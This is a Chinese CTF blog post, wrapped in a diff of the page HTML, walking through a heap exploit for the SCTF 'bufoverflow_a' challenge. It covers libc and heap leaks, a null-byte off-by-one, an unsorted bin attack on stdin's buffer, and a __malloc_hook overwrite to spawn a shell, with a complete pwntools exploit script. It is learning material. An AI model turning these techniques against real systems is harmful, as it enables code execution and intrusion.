@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="loeklvlh">
+
+
+
+<meta name="description" content="本来以为应该能出一两道ctf的pwn了，结果又被sctf打击了一波。 bufoverflow_a 做这题时libc和堆地址都泄露完成了，卡在了unsorted bin attack上，由于delete会清0变量导致无法写，一直没构造出unsorted bin attack，后面根据wp发现只要修改一下free的顺序就行了。 这题的主要功能如下：正常的堆题模板，1是申请堆，2是删除堆，3是写刚申请的">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn学习之四">
+<meta property="og:url" content="http://loeklvlh.top/2019/05/10/pwn学习之四/index.html">
+<meta property="og:site_name" content="loeklvlh&#39;s blog">
+<meta property="og:description" content="本来以为应该能出一两道ctf的pwn了，结果又被sctf打击了一波。 bufoverflow_a 做这题时libc和堆地址都泄露完成了，卡在了unsorted bin attack上，由于delete会清0变量导致无法写，一直没构造出unsorted bin attack，后面根据wp发现只要修改一下free的顺序就行了。 这题的主要功能如下：正常的堆题模板，1是申请堆，2是删除堆，3是写刚申请的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwn学习之四/1.png">
+<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwn学习之四/2.png">
+<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwn学习之四/3.png">
+<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwn学习之四/4.png">
+<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwn学习之四/5.png">
+<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwn学习之四/6.png">
+<meta property="og:updated_time" content="2019-05-10T06:10:26.079Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwn学习之四">
+<meta name="twitter:description" content="本来以为应该能出一两道ctf的pwn了，结果又被sctf打击了一波。 bufoverflow_a 做这题时libc和堆地址都泄露完成了，卡在了unsorted bin attack上，由于delete会清0变量导致无法写，一直没构造出unsorted bin attack，后面根据wp发现只要修改一下free的顺序就行了。 这题的主要功能如下：正常的堆题模板，1是申请堆，2是删除堆，3是写刚申请的">
+<meta name="twitter:image" content="http://loeklvlh.top/2019/05/10/pwn学习之四/1.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="loeklvlh&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>pwn学习之四 | loeklvlh&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">loeklvlh</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">练习时长两年半的天枢萌新pwn</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false">
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/spark/">spark</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">loeklvlh</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">loeklvlh</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">练习时长两年半的天枢萌新pwn</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
+</nav>
+      <div class="body-wrap"><article id="post-pwn学习之四" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/10/pwn学习之四/" class="article-date">
+      <time datetime="2019-05-10T06:02:49.000Z" itemprop="datePublished">2019-05-10</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pwn学习之四
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>本来以为应该能出一两道ctf的pwn了，结果又被sctf打击了一波。</p>
+<p>bufoverflow_a</p>
+<p>做这题时libc和堆地址都泄露完成了，卡在了unsorted bin attack上，由于delete会清0变量导致无法写，一直没构造出unsorted bin attack，后面根据wp发现只要修改一下free的顺序就行了。</p>
+<p>这题的主要功能如下：<br><img src="/2019/05/10/pwn学习之四/1.png" alt="ida"><br>正常的堆题模板，1是申请堆，2是删除堆，3是写刚申请的堆，4是输出刚申请的堆的内容，5结束。</p>
+<p>首先泄露libc的地址，申请堆只能申请0x7f到0x1000的大小，也就是不能申请fastbin，构造堆分布如下：<br><img src="/2019/05/10/pwn学习之四/2.png" alt="ida"><br>先申请两个0x88的chunk，然后free chunk 1，再申请一个0x88的堆，这时候这个堆的fd和bk指向main_arena+88，再执行show函数就可以泄露libc(这里注意不能申请过多堆，因为题目中只有堆的个数小于2的时候用的malloc，大于就用calloc，会清空堆的内容)</p>
+<p>堆地址也可以用类似方法泄露，构造堆分布：<br><img src="/2019/05/10/pwn学习之四/3.png" alt="ida"><br>先申请4个0x88堆，再free堆块1和堆块3，堆块4，这样堆块3,4，top_chunk会合并，这时top_chunk的fd会是chunk 1，所以再申请一个大于0x88的堆会从top_chunk分配再show就能泄露堆地址。</p>
+<p>再fill函数中存在null byte off-by-one漏洞，常规思路就是用null byte off-by-one造成overlap然后unsorted bin attack，这题有scanf函数，可以修改stdin的buf_end然后覆盖malloc_hook成one_gadget，用house of orange应该也是能出的。<br><img src="/2019/05/10/pwn学习之四/4.png" alt="ida"><br>首先构造堆块如下：<br><img src="/2019/05/10/pwn学习之四/5.png" alt="ida"><br>先申请了4个堆块，然后free掉第一个和第二个堆块，再申请第一个堆块，这样就可以写第一个堆块并使用漏洞将第二个堆块的size最后一位修改为\x00，这时第二个堆块还在unsorted bin里面。</p>
+<p>接着继续申请4个堆块大小大于7f并且4个大小相加小于0x400。由于前面第二个堆块的size改变了导致unsorted bin大小变了但是后面堆块也就是之前申请的大小0x100的堆块的pre_size并没有更新(因为是通过unsortedbin这个堆的size来找下一个堆的pre_size去修改，但是现在size小于原来的size，所以找到的位置并不是0x100的堆的pre_size的位置而是更上面的地方)。申请过后堆的情况如下：<br><img src="/2019/05/10/pwn学习之四/6.png" alt="ida"><br>接着按照上图free 0x88,0x100,0x200，由于0x100的堆块的pre_size还是之前的值，所以会和0x88的堆块合并，就会造成一个大的unsortedbin并且包含了之前申请的0x200的堆块。(这里要特别注意free的顺序，由于只有刚申请的块能够写入，所以这里我们需要提前构造一个unsorted bin在之后申请的堆的内部，而unsorted bin是先入先出的结构如果前面的未满足申请的大小就会放入对应的smallbin或者largebin里面，所以先free了0x88,0x100使得两个块合并后有一个unsortedbin，再free 0x200得到第二个unsortedbin，这样下次malloc的时候第一个unsortedbin符合返回了，就不会把后面的unsortedbin放入smallbin里面去了)。</p>
+<p>申请一个大小为0x518的块，这时这个块就包含了里面0x200的那个unsortedbin块，fill函数写入将unsortedbin的块的bk改为stdin+0x30，接着申请一个0x208的块就完成了unsorted bin attack，这时bk+0x10会被赋值为unsortedbin地址也就是main_arena+88，而stdin+0x30+0x10的位置就是buf_end的位置，所以buf_end被赋值为main_arena+88。</p>
+<p>scanf写入时会先将输入放入缓冲区内，再写入，而缓冲区的位置就是buf_base，大小是buf_end-buf_base，现在修改了buf_end，也就是说我们可以任意写入值到buf_base到buf_end之间，而这之间就存在malloc_hook。</p>
+<p>然而在这之间还需要保证两个值的正确性，一个是lock一个是vtable,lock需要一个指向0的地址，vtable就用原来的地址就行，所以构造payload如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'1\n\x00\x00\x00'</span></span><br><span class="line">payload +=p64(malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x39b770</span>)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">9</span>+p64(malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x396440</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1ad</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br></pre></td></tr></table></figure></p>
+<p>这里看的wp都是前5个字符都是\x00，同样可以使得程序进入到1选项中去申请堆块，不是很理解，应该是和scanf接收\x00的处理有关，这里我构造的前5个字节为’1\n\x00\x00\x00’，因为scanf碰到\n会将\n替换为\x00，这里就能保证输入1，进入了1选项后去申请一个大小的堆，就会跳到malloc_hook去执行one_gadget拿到shell了。<br>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bufoverflow_a'</span>)</span><br><span class="line"><span class="comment">#p = remote('116.62.152.176', 20001)</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(p,size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p,index)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(p,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(p)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">alloc(p,str(<span class="number">0x88</span>)) <span class="comment">#0</span></span><br><span class="line">alloc(p,str(<span class="number">0x300</span>)) <span class="comment">#1</span></span><br><span class="line">delete(p,str(<span class="number">0</span>)) <span class="comment">#free 0</span></span><br><span class="line">alloc(p,str(<span class="number">0x88</span>)) <span class="comment">#0</span></span><br><span class="line">show(p)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">malloc_hook = main_arena<span class="number">-0x10</span></span><br><span class="line">io_list_all_addr = libc.symbols[<span class="string">'_IO_list_all'</span>]+malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">jump_table_addr = libc.symbols[<span class="string">'_IO_file_jumps'</span>]+malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]+malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">stdin = libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]+malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">binsh = libc.search(<span class="string">'/bin/sh\x00'</span>).next()+malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = <span class="number">0xd6655</span>+malloc_hook -libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'one_gadget:'</span>,hex(one_gadget)</span><br><span class="line"><span class="comment">#one_gadget = 0x45216+malloc_hook -libc.symbols['__malloc_hook']</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'stdin:'</span>,hex(stdin)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'lock:'</span>,hex(malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x39b770</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'io_jump:'</span>,hex(malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x396440</span>)</span><br><span class="line"><span class="comment">#clear</span></span><br><span class="line">delete(p,str(<span class="number">0</span>))</span><br><span class="line">delete(p,str(<span class="number">1</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#leak heap</span></span><br><span class="line">alloc(p,str(<span class="number">0x88</span>))<span class="comment">#0</span></span><br><span class="line">alloc(p,str(<span class="number">0x88</span>))<span class="comment">#1</span></span><br><span class="line">alloc(p,str(<span class="number">0x88</span>))<span class="comment">#2</span></span><br><span class="line">alloc(p,str(<span class="number">0x88</span>))<span class="comment">#3</span></span><br><span class="line">delete(p,str(<span class="number">0</span>)) <span class="comment">#free 0</span></span><br><span class="line">delete(p,str(<span class="number">2</span>)) <span class="comment">#free 2</span></span><br><span class="line">delete(p,str(<span class="number">3</span>)) <span class="comment">#free 3</span></span><br><span class="line">alloc(p,str(<span class="number">0x100</span>))<span class="comment">#0</span></span><br><span class="line">show(p)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">fake_heap = heap_addr<span class="number">-0x20</span>+<span class="number">0x18</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"><span class="comment">#clear</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">delete(p,str(<span class="number">0</span>))</span><br><span class="line">delete(p,str(<span class="number">1</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#unsafe unlink</span></span><br><span class="line">alloc(p,str(<span class="number">0x88</span>))<span class="comment">#0</span></span><br><span class="line">alloc(p,str(<span class="number">0x400</span>))<span class="comment">#1</span></span><br><span class="line">alloc(p,str(<span class="number">0x100</span>))<span class="comment">#2</span></span><br><span class="line">alloc(p,str(<span class="number">0x88</span>))<span class="comment">#3</span></span><br><span class="line"> </span><br><span class="line">delete(p,str(<span class="number">0</span>))</span><br><span class="line">delete(p,str(<span class="number">1</span>))</span><br><span class="line">alloc(p,str(<span class="number">0x88</span>))<span class="comment">#0</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span></span><br><span class="line">fill(p,payload)</span><br><span class="line"> </span><br><span class="line">alloc(p,str(<span class="number">0x88</span>)) <span class="comment">#1</span></span><br><span class="line">alloc(p,str(<span class="number">0x88</span>)) <span class="comment">#4</span></span><br><span class="line">alloc(p,str(<span class="number">0x200</span>)) <span class="comment">#5</span></span><br><span class="line">alloc(p,str(<span class="number">0xb8</span>)) <span class="comment">#6</span></span><br><span class="line"> </span><br><span class="line">delete(p,str(<span class="number">1</span>))</span><br><span class="line">delete(p,str(<span class="number">2</span>))</span><br><span class="line">delete(p,str(<span class="number">5</span>))</span><br><span class="line"> </span><br><span class="line">alloc(p,str(<span class="number">0x518</span>))</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">payload += <span class="string">'b'</span>*<span class="number">0x80</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x211</span>)</span><br><span class="line">payload += p64(main_arena+<span class="number">88</span>) + p64(stdin+<span class="number">0x30</span>)</span><br><span class="line">fill(p,payload+<span class="string">'\n'</span>)</span><br><span class="line"> </span><br><span class="line">alloc(p,str(<span class="number">0x208</span>))</span><br><span class="line"> </span><br><span class="line"><span class="string">'''payload = '1\n\x00\x00\x00'#'\x00'*5</span></span><br><span class="line"><span class="string">payload += p64(malloc_hook-libc.symbols['__malloc_hook']+0x39b770)</span></span><br><span class="line"><span class="string">payload += p64(0xffffffffffffffff) + p64(0)</span></span><br><span class="line"><span class="string">payload += p64(malloc_hook-libc.symbols['__malloc_hook']+0x3999a0)+p64(0)</span></span><br><span class="line"><span class="string">payload += p64(0)*2</span></span><br><span class="line"><span class="string">payload += p64(0xffffffff)+p64(0)</span></span><br><span class="line"><span class="string">payload += p64(0) + p64(malloc_hook-libc.symbols['__malloc_hook']+0x396440)</span></span><br><span class="line"><span class="string">payload += '\x00'*0x130</span></span><br><span class="line"><span class="string">payload += p64(malloc_hook-libc.symbols['__malloc_hook']+0x395f00)+p64(0)</span></span><br><span class="line"><span class="string">payload += p64(malloc_hook-libc.symbols['__malloc_hook']+0x7c610)+p64(0)</span></span><br><span class="line"><span class="string">payload += p64(one_gadget)'''</span></span><br><span class="line">payload = <span class="string">'1\n\x00\x00\x00'</span></span><br><span class="line">payload +=p64(malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x39b770</span>)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">9</span>+p64(malloc_hook-libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x396440</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1ad</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x88</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>主要写了一些在复现时候踩的坑和一些不理解的地方(大佬们可以自动忽略这些废话。。。)。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/05/10/pwn学习之四/">pwn学习之四</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">loeklvlh</a></p>
+        <p><span>发布时间:</span>2019-05-10, 14:02:49</p>
+        <p><span>最后更新:</span>2019-05-10, 14:10:26</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/10/pwn学习之四/" title="pwn学习之四">http://loeklvlh.top/2019/05/10/pwn学习之四/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://loeklvlh.top/2019/05/10/pwn学习之四/　　作者: loeklvlh" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/05/10/pwn易忘操作原理笔记/">
+                    pwn易忘操作原理笔记
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/05/10/pwn学习之三/">
+                    pwn学习之三
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"pwn学习之四　| loeklvlh's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
